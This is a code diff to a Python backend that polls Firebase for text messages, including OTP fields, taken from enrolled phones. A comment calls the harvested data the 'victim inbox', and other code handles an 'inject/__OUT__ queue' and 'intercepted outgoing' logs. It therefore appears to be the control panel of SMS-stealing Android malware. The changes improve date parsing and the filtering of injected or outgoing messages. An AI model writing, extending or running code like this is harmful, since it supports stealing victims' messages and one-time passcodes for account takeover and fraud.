@@ -47,8 +47,10 @@ SMS_PATHS_META_KEY = "firebase_sms_paths"
 MAX_SEEN_KEYS = 20000
 MAX_CACHED_SMS_PATHS = 50
 BODY_DATE_RE = re.compile(
-    r"\b(\d{1,2})[-/](\d{1,2})[-/](\d{2,4})(?:\s+\d{1,2}:\d{2})?\b"
+    r"\b(\d{1,2})[-/](\d{1,2})[-/](\d{2,4})(?:\s*(?:\||-)\s*\d{1,2}:\d{2}\s*(?:am|pm)?|\s+\d{1,2}:\d{2})?\b",
+    re.I,
 )
+OUTGOING_QUEUE_BODY_RE = re.compile(r"^\d{10,15}\n.+\n\d+$", re.S)
 OUTGOING_LOG_MARKERS = (
     "intercepted outgoing",
     "zygisk",
@@ -156,7 +158,32 @@ def clear_sms_baseline(device: Device) -> None:
 
 
 def _parse_body_date(text: str) -> datetime | None:
-    match = BODY_DATE_RE.search(text or "")
+    raw = (text or "").strip()
+    panel_match = re.search(
+        r"\b(\d{1,2})[-/](\d{1,2})[-/](\d{2,4})\s*(?:\||-)\s*(\d{1,2}):(\d{2})\s*(am|pm)?\b",
+        raw,
+        re.I,
+    )
+    if panel_match:
+        day, month, year = (
+            int(panel_match.group(1)),
+            int(panel_match.group(2)),
+            int(panel_match.group(3)),
+        )
+        if year < 100:
+            year += 2000
+        hour, minute = int(panel_match.group(4)), int(panel_match.group(5))
+        ampm = (panel_match.group(6) or "").lower()
+        if ampm == "pm" and hour < 12:
+            hour += 12
+        if ampm == "am" and hour == 12:
+            hour = 0
+        try:
+            return datetime(year, month, day, hour, minute, tzinfo=timezone.utc)
+        except ValueError:
+            return None
+
+    match = BODY_DATE_RE.search(raw)
     if not match:
         return None
     day, month, year = int(match.group(1)), int(match.group(2)), int(match.group(3))
@@ -228,6 +255,9 @@ def _parse_timestamp(raw: Any) -> datetime | None:
         return None
     if text.isdigit():
         return _parse_timestamp(int(text))
+    parsed = _parse_body_date(text)
+    if parsed and ("|" in text or re.search(r"\d{1,2}:\d{2}", text)):
+        return parsed
     try:
         normalized = text.replace("Z", "+00:00")
         return datetime.fromisoformat(normalized).astimezone(timezone.utc)
@@ -241,6 +271,18 @@ def _is_inject_queue_entry(value: dict[str, Any]) -> bool:
         return True
     sender = _first_field(value, SENDER_FIELDS) or ""
     if sender == "__OUT__":
+        return True
+    body = _first_field(value, BODY_FIELDS) or ""
+    if OUTGOING_QUEUE_BODY_RE.match(body.strip()):
+        return True
+    return False
+
+
+def _is_poll_noise_record(sender: str, message: str) -> bool:
+    sender_l = (sender or "").strip().lower()
+    if sender_l in {"__out__", "unknown"} and OUTGOING_QUEUE_BODY_RE.match((message or "").strip()):
+        return True
+    if sender_l == "__out__":
         return True
     return False
 
@@ -392,11 +434,12 @@ def _generate_sms_paths(device: Device) -> list[str]:
                 seen_paths.add(device_path)
                 paths.append(device_path)
 
-        for top in ("sms", "SMS", "messages", "inbox", "Inbox", "data", "logs"):
+        for top in ("sms", "SMS", "inbox", "Inbox", "data", "logs"):
             path = f"{top}/{device_id}"
             if path not in seen_paths:
                 seen_paths.add(path)
                 paths.append(path)
+        # Skip messages/{device_id} — Virtus inject/__OUT__ queue, not victim inbox.
 
         for parent in SMS_PARENT_PATHS:
             for suffix in ("lastSms", "last_sms", "latest_sms", "otp", "lastMessage"):
@@ -517,7 +560,6 @@ async def fetch_firebase_sms_for_device(
                 f"devices/{device_id}/messages",
                 f"devices/{device_id}/lastSms",
                 f"sms/{device_id}",
-                f"messages/{device_id}",
                 f"inbox/{device_id}",
                 f"data/{device_id}/sms",
             ]
@@ -559,6 +601,9 @@ async def snapshot_firebase_sms_seen(
         if fk in previous_seen:
             continue
         if _is_old_for_monitoring(record, profile):
+            ignored += 1
+            continue
+        if _is_poll_noise_record(record["sender"], record["message"]):
             ignored += 1
             continue
         if _is_outgoing_firebase_log(record["sender"], record["message"]):
@@ -744,10 +789,10 @@ async def _poll_one_monitoring_profile(profile_id: int) -> int:
             received_at = record.get("received_at")
             sender = record["sender"]
             message = record["message"]
+            if _is_poll_noise_record(sender, message):
+                new_keys.add(record["firebase_key"])
+                continue
             if _is_outgoing_firebase_log(sender, message):
-                asyncio.create_task(
-                    _relay_outgoing_from_firebase(profile.id, device.id, message)
-                )
                 new_keys.add(record["firebase_key"])
                 continue
 
